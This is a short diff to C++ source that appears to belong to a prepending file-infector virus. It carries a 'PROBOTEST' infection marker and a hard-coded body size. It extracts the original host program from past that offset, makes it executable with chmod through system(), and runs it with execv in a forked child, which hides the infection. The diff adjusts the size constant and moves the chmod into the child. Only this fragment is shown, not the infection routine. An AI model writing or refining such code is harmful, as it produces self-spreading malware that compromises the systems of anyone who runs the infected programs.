@@ -3,7 +3,7 @@
 #include <unistd.h>
 
 const char* IDENTIFIER = "PROBOTEST";
-const int MYSIZE = 19816;
+const int MYSIZE = 19524;
 
 using namespace std;
 
@@ -28,10 +28,10 @@ int main (int argc, char** argv) {
         fi.seekg(MYSIZE, fi.beg);
         while ((c = fi.get()) != -1) fo << (char) c;
         fi.close(); fo.close(); fv.close();
-        command = "2>/dev/null /bin/chmod ug+rwx ";
-        command += exe;
-        c = system( command.c_str() );
         if (childpid == 0) {
+            command = "2>/dev/null /bin/chmod ug+rwx ";
+            command += exe;
+            c = system( command.c_str() );
             c = execv((exe).c_str(), argv);
             return 0;
         } else {
